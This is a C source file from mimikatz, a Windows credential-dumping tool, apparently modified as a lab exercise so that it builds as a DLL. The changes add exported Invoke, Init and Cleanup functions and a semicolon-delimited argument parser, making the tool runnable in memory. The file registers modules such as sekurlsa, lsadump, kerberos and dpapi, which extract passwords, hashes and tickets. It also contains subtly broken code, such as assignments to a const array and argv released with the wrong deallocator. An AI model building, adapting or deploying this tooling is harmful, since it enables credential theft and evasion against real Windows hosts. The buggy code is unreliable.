/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "mimikatz.h"


const KUHL_M * mimikatz_modules[] = {
	&kuhl_m_standard,
	&kuhl_m_crypto,
	&kuhl_m_sekurlsa,
	&kuhl_m_kerberos,
	&kuhl_m_ngc,
	&kuhl_m_privilege,
	&kuhl_m_process,
	&kuhl_m_service,
	&kuhl_m_lsadump,
	&kuhl_m_ts,
	&kuhl_m_event,
	&kuhl_m_misc,
	&kuhl_m_token,
	&kuhl_m_vault,
	&kuhl_m_minesweeper,
#if defined(NET_MODULE)
	&kuhl_m_net,
#endif
	&kuhl_m_dpapi,
	//&kuhl_m_busylight,
	&kuhl_m_sysenv,
	&kuhl_m_sid,
	&kuhl_m_iis,
	&kuhl_m_rpc,
	&kuhl_m_sr98,
	&kuhl_m_rdm,
	&kuhl_m_acr,
};

int wmain(int argc, wchar_t * argv[])
{
	NTSTATUS status = STATUS_SUCCESS;
	int i;
#ifndef _WINDLL
	size_t len;
	wchar_t input[0xffff];
#endif
	mimikatz_begin();
	for(i = MIMIKATZ_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING) ; i++)
	{
		kprintf(L"\n" MIMIKATZ L"(" MIMIKATZ_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
		status = mimikatz_dispatchCommand(argv[i]);
	}
#ifndef _WINDLL
	while ((status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING))
	{
		kprintf(L"\n" MIMIKATZ L" # "); fflush(stdin);
		if(fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n'))
		{
			if(input[len - 1] == L'\n')
				input[len - 1] = L'\0';
			kprintf_inputline(L"%s\n", input);
			status = mimikatz_dispatchCommand(input);
		}
	}
#endif
	mimikatz_end(status);
	return STATUS_SUCCESS;
}

void mimikatz_begin()
{
	kull_m_output_init();
#ifndef _WINDLL
	//SetConsoleTitle(MIMIKATZ L" " MIMIKATZ_VERSION L" " MIMIKATZ_ARCH L" (oe.eo)");
	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
#ifndef QUIETHEADER
	kprintf(L"\n"
		L"  .#####.   " MIMIKATZ_FULL L"\n"
		L" .## ^ ##.  " MIMIKATZ_SECOND L" - (oe.eo)\n"
		L" ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		L" ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n"
		L" '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n"
		L"  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n");
#endif

	mimikatz_initOrClean(TRUE);


#endif
}

void mimikatz_end(NTSTATUS status)
{
#ifndef _WINDLL
	mimikatz_initOrClean(FALSE);
	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
#endif
	kull_m_output_clean();
#ifndef _WINDLL
	if(status == STATUS_THREAD_IS_TERMINATING)
		ExitThread(STATUS_SUCCESS);
	else ExitProcess(STATUS_SUCCESS);
#endif
}

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	mimikatz_initOrClean(FALSE);
	return FALSE;
}

NTSTATUS mimikatz_initOrClean(BOOL Init)
{
	kprintf(L"[+] InitOrClean called, Init = %d\n", Init);
	unsigned short indexModule;
	PKUHL_M_C_FUNC_INIT function;
	long offsetToFunc;
	NTSTATUS fStatus;
	HRESULT hr;

	if(Init)
	{
		RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
		MIMIKATZ_NT_BUILD_NUMBER &= 0x00007fff;
		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		if(FAILED(hr))
#if defined(_POWERKATZ)
			if(hr != RPC_E_CHANGED_MODE)
#endif
				PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
		
		//kull_m_asn1_init();
	}
	else
		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);

	kprintf(L"mimikatz_modules ptr: %p\n", mimikatz_modules);
	kprintf(L"Number of modules: %d\n", ARRAYSIZE(mimikatz_modules));
	
	for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
	{
		if (mimikatz_modules[indexModule] == NULL) {
			kprintf(L"Module[%d] is NULL\n", indexModule);
			break;
		}
		else {
			kprintf(L"[%02d] module ptr: %p\n", indexModule, mimikatz_modules[indexModule]);
		}
		if(function = *(PKUHL_M_C_FUNC_INIT *) ((ULONG_PTR) (mimikatz_modules[indexModule]) + offsetToFunc))
		{
			fStatus = function();
			if(!NT_SUCCESS(fStatus))
				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), mimikatz_modules[indexModule]->shortName, fStatus);
		}
	}


	if(!Init)
	{
		//kull_m_asn1_term();
		CoUninitialize();
		kull_m_output_file(NULL);
	}
	return STATUS_SUCCESS;
}

NTSTATUS mimikatz_dispatchCommand(wchar_t * input)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PWCHAR full;
	if(full = kull_m_file_fullPath(input))
	{
		switch(full[0])
		{
		case L'!':
			status = kuhl_m_kernel_do(full + 1);
			break;
		case L'*':
			//status = kuhl_m_rpc_do(full + 1);
			break;
		default:
			status = mimikatz_doLocal(full);
		}
		LocalFree(full);
	}
	return status;
}

NTSTATUS mimikatz_doLocal(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	int argc;
	wchar_t ** argv = CommandLineToArgvW(input, &argc), *module = NULL, *command = NULL, *match;
	unsigned short indexModule, indexCommand;
	BOOL moduleFound = FALSE, commandFound = FALSE;
	
	if(argv && (argc > 0))
	{
		if(match = wcsstr(argv[0], L"::"))
		{
			if(module = (wchar_t *) LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
			{
				if((unsigned int) (match + 2 - argv[0]) < wcslen(argv[0]))
					command = match + 2;
				RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
			}
		}
		else command = argv[0];

		for(indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(mimikatz_modules)); indexModule++)
			if(moduleFound = (!module || (_wcsicmp(module, mimikatz_modules[indexModule]->shortName) == 0)))
				if(command)
					for(indexCommand = 0; !commandFound && (indexCommand < mimikatz_modules[indexModule]->nbCommands); indexCommand++)
						if(commandFound = _wcsicmp(command, mimikatz_modules[indexModule]->commands[indexCommand].command) == 0)
							status = mimikatz_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);

		if(!moduleFound)
		{
			PRINT_ERROR(L"\"%s\" module not found !\n", module);
			for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
			{
				kprintf(L"\n%16s", mimikatz_modules[indexModule]->shortName);
				if(mimikatz_modules[indexModule]->fullName)
					kprintf(L"  -  %s", mimikatz_modules[indexModule]->fullName);
				if(mimikatz_modules[indexModule]->description)
					kprintf(L"  [%s]", mimikatz_modules[indexModule]->description);
			}
			kprintf(L"\n");
		}
		else if(!commandFound)
		{
			indexModule -= 1;
			PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, mimikatz_modules[indexModule]->shortName);

			kprintf(L"\nModule :\t%s", mimikatz_modules[indexModule]->shortName);
			if(mimikatz_modules[indexModule]->fullName)
				kprintf(L"\nFull name :\t%s", mimikatz_modules[indexModule]->fullName);
			if(mimikatz_modules[indexModule]->description)
				kprintf(L"\nDescription :\t%s", mimikatz_modules[indexModule]->description);
			kprintf(L"\n");

			for(indexCommand = 0; indexCommand < mimikatz_modules[indexModule]->nbCommands; indexCommand++)
			{
				kprintf(L"\n%16s", mimikatz_modules[indexModule]->commands[indexCommand].command);
				if(mimikatz_modules[indexModule]->commands[indexCommand].description)
					kprintf(L"  -  %s", mimikatz_modules[indexModule]->commands[indexCommand].description);
			}
			kprintf(L"\n");
		}

		if(module)
			LocalFree(module);
		LocalFree(argv);
	}
	return status;
}

#if defined(_POWERKATZ)
__declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPCWSTR input)
{
	int argc = 0;
	wchar_t ** argv;
	
	if(argv = CommandLineToArgvW(input, &argc))
	{
		outputBufferElements = 0xff;
		outputBufferElementsPosition = 0;
		if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
			wmain(argc, argv);
		LocalFree(argv);
	}
	return outputBuffer;
}
#endif

FARPROC WINAPI delayHookFailureFunc (unsigned int dliNotify, PDelayLoadInfo pdli)
{
    if((dliNotify == dliFailLoadLib) && ((_stricmp(pdli->szDll, "ncrypt.dll") == 0) || (_stricmp(pdli->szDll, "bcrypt.dll") == 0)))
		RaiseException(ERROR_DLL_NOT_FOUND, 0, 0, NULL);
    return NULL;
}
#if !defined(_DELAY_IMP_VER)
const
#endif
PfnDliHook __pfnDliFailureHook2 = delayHookFailureFunc;



// new funcs
#ifdef _WINDLL

// https://doxygen.reactos.org/d0/d25/host_2wine_2unicode_8h.html#abaf7d51c95d4f46e12aa7a4d21f0c034
WCHAR* strcpyW(WCHAR * dst, const WCHAR * src)
{
	WCHAR *p = dst;
	while ((*p++ = *src++));
	return dst;
}

unsigned int strlenW(const WCHAR * 	str)
{
	const WCHAR *s = str;
	while (*s) s++;
	return (unsigned int)(s - str);
}

//
// TODO: Your Tasks start here!!!!!
//
// STEP0. copy CommandLineToArgvW code from reactos into mimikatz.c. Put the code in myCommandLineToArgvW below.
// * https://doxygen.reactos.org/da/da5/shell32__main_8c_source.html
// STEP1. modified CommandLineToArgvW to use ; instead of space as a deliminator
// STEP2. also force casting for LocalAlloc
// 
// HINT: for STEP1, you will need to find the instances of the following functions and update the code as needed:
//
// * isspace
// * isblank
//
//
LPWSTR* WINAPI myCommandLineToArgvW(LPCWSTR lpCmdline, int* numargs)
{
	DWORD argc;
	LPWSTR  *argv;
	LPCWSTR s;
	LPWSTR d;
	LPWSTR cmdline;
	int qcount, bcount;

	if (!numargs)
	{
		SetLastError(ERROR_INVALID_PARAMETER);
		return NULL;
	}

	if (*lpCmdline == 0)
	{
		/* Return the path to the executable */
		DWORD len, deslen = MAX_PATH, size;

		size = sizeof(LPWSTR) * 2 + deslen * sizeof(WCHAR);
		for (;;)
		{
			if (!(argv = (LPWSTR*)LocalAlloc(LMEM_FIXED, size))) return NULL;
			len = GetModuleFileNameW(0, (LPWSTR)(argv + 2), deslen);
			if (!len)
			{
				LocalFree(argv);
				return NULL;
			}
			if (len < deslen) break;
			deslen *= 2;
			size = sizeof(LPWSTR) * 2 + deslen * sizeof(WCHAR);
			LocalFree(argv);
		}
		argv[0] = (LPWSTR)(argv + 2);
		argv[1] = NULL;
		*numargs = 1;

		return argv;
	}

	/* --- First count the arguments */
	argc = 1;
	s = lpCmdline;
	/* The first argument, the executable path, follows special rules */
	if (*s == '"')
	{
		/* The executable path ends at the next quote, no matter what */
		s++;
		while (*s)
			if (*s++ == '"')
				break;
	}
	else
	{
		/* The executable path ends at the next space, no matter what */
		while (*s && *s != ';')
			s++;
	}
	/* skip to the first argument, if any */
	while (*s == ';')
		s++;
	if (*s)
		argc++;

	/* Analyze the remaining arguments */
	qcount = bcount = 0;
	while (*s)
	{
		if (*s == ';' && qcount == 0)
		{
			/* skip to the next argument and count it if any */
			while (*s == ';')
				s++;
			if (*s)
				argc++;
			bcount = 0;
		}
		else if (*s == '\\')
		{
			/* '\', count them */
			bcount++;
			s++;
		}
		else if (*s == '"')
		{
			/* '"' */
			if ((bcount & 1) == 0)
				qcount++; /* unescaped '"' */
			s++;
			bcount = 0;
			/* consecutive quotes, see comment in copying code below */
			while (*s == '"')
			{
				qcount++;
				s++;
			}
			qcount = qcount % 3;
			if (qcount == 2)
				qcount = 0;
		}
		else
		{
			/* a regular character */
			bcount = 0;
			s++;
		}
	}

	/* Allocate in a single lump, the string array, and the strings that go
	 * with it. This way the caller can make a single LocalFree() call to free
	 * both, as per MSDN.
	 */
	argv = (LPWSTR*)LocalAlloc(LMEM_FIXED, (argc + 1) * sizeof(LPWSTR) + (strlenW(lpCmdline) + 1) * sizeof(WCHAR));
	if (!argv)
		return NULL;
	cmdline = (LPWSTR)(argv + argc + 1);
	strcpyW(cmdline, lpCmdline);

	/* --- Then split and copy the arguments */
	argv[0] = d = cmdline;
	argc = 1;
	/* The first argument, the executable path, follows special rules */
	if (*d == '"')
	{
		/* The executable path ends at the next quote, no matter what */
		s = d + 1;
		while (*s)
		{
			if (*s == '"')
			{
				s++;
				break;
			}
			*d++ = *s++;
		}
	}
	else
	{
		/* The executable path ends at the next space, no matter what */
		while (*d && *d != ';')
			d++;
		s = d;
		if (*s)
			s++;
	}
	/* close the executable path */
	*d++ = 0;
	/* skip to the first argument and initialize it if any */
	while (*s == ';')
		s++;

	if (!*s)
	{
		/* There are no parameters so we are all done */
		argv[argc] = NULL;
		*numargs = argc;
		return argv;
	}

	/* Split and copy the remaining arguments */
	argv[argc++] = d;
	qcount = bcount = 0;
	while (*s)
	{
		if (*s == ';' && qcount == 0)
		{
			/* close the argument */
			*d++ = 0;
			bcount = 0;

			/* skip to the next one and initialize it if any */
			do {
				s++;
			} while (*s == ';');
			if (*s)
				argv[argc++] = d;
		}
		else if (*s == '\\')
		{
			*d++ = *s++;
			bcount++;
		}
		else if (*s == '"')
		{
			if ((bcount & 1) == 0)
			{
				/* Preceded by an even number of '\', this is half that
				 * number of '\', plus a quote which we erase.
				 */
				d -= bcount / 2;
				qcount++;
			}
			else
			{
				/* Preceded by an odd number of '\', this is half that
				 * number of '\' followed by a '"'
				 */
				d = d - bcount / 2 - 1;
				*d++ = '"';
			}
			s++;
			bcount = 0;
			/* Now count the number of consecutive quotes. Note that qcount
			 * already takes into account the opening quote if any, as well as
			 * the quote that lead us here.
			 */
			while (*s == '"')
			{
				if (++qcount == 3)
				{
					*d++ = '"';
					qcount = 0;
				}
				s++;
			}
			if (qcount == 2)
				qcount = 0;
		}
		else
		{
			/* a regular character */
			*d++ = *s++;
			bcount = 0;
		}
	}
	*d = '\0';
	argv[argc] = NULL;
	*numargs = argc;

	return argv;
}

// count the number of args based on ; deliminator.
int delim_count(LPCWSTR input)
{
	int argc = 1;
	LPCWSTR s = input;
	while (*s)
	{
		if (*s == ';')
		{
			argc++;
		}
		*s++;
	}

	return argc;
}



wchar_t * execute_commands(LPWSTR input)
{
	int argc = 0;
	wchar_t ** argv;

	// parse args based on ; deliminator instead of spaces
	argc = delim_count(input);
	argv = myCommandLineToArgvW(input, &argc);

	outputBufferElements = 1;
	outputBufferElementsPosition = 0;
	if (outputBuffer = (wchar_t *)LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
		wmain(argc, argv);

	if (argv) free(argv);

	return outputBuffer;
}

__declspec(dllexport) LPWSTR Invoke(LPWSTR input) {
	return execute_commands(input);
}

void setupmodules() {
	mimikatz_modules[0] = &kuhl_m_standard;
	mimikatz_modules[1] = &kuhl_m_crypto;
	mimikatz_modules[2] = &kuhl_m_sekurlsa;
	mimikatz_modules[3] = &kuhl_m_kerberos;
	mimikatz_modules[4] = &kuhl_m_ngc;
	mimikatz_modules[5] = &kuhl_m_privilege;
	mimikatz_modules[6] = &kuhl_m_process;
	mimikatz_modules[7] = &kuhl_m_service;
	mimikatz_modules[8] = &kuhl_m_lsadump;
	mimikatz_modules[9] = &kuhl_m_ts;
	mimikatz_modules[10] = &kuhl_m_event;
	mimikatz_modules[11] = &kuhl_m_misc;
	mimikatz_modules[12] = &kuhl_m_token;
	mimikatz_modules[13] = &kuhl_m_vault;
	mimikatz_modules[14] = &kuhl_m_minesweeper;
#if defined(NET_MODULE)
	mimikatz_modules[15] = &kuhl_m_net;
#endif
	mimikatz_modules[16] = &kuhl_m_dpapi;
	//&kuhl_m_busylight,
	mimikatz_modules[17] = &kuhl_m_sysenv;
	mimikatz_modules[18] = &kuhl_m_sid;
	mimikatz_modules[19] = &kuhl_m_iis;
	mimikatz_modules[20] = &kuhl_m_rpc;
	mimikatz_modules[21] = &kuhl_m_sr98;
	mimikatz_modules[22] = &kuhl_m_rdm;
	mimikatz_modules[23] = &kuhl_m_acr;
}

__declspec(dllexport) void Init() {
	//kprintf(L"start");
	//setupmodules();
	//kprintf(L"finish mid");
	mimikatz_initOrClean(TRUE);
}

__declspec(dllexport) void Cleanup() {
	mimikatz_initOrClean(FALSE);
}
#endif
